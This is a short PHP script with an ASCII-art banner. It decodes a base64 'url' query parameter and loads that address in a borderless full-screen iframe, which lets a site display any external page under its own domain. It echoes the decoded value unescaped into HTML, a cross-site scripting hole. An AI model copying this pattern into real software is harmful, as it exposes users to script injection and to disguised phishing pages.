<?php
//    ________                          ___  ____           _
//   |_   __  |                        |_  ||_  _|         / |_
//   | |_ \_| _ .--.  .---.  _ .--.    | |_/ /    _ .--.`| |-'
//   |  _| _ [ `/'`\]/ /__\\[ `.-. |   |  __'.   [ `/'`\]| |
//  _| |__/ | | |    | \__., | | | |  _| |  \ \_  | |    | |,
// |________|[___]    '.__.'[___||__]|____||____|[___]   \__/

if(isset($_GET["url"])){
  if($_GET["url"]!=""){
    ?>
<iframe src="<?php echo base64_decode($_GET["url"]); ?>" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>
    <?php
  }
}
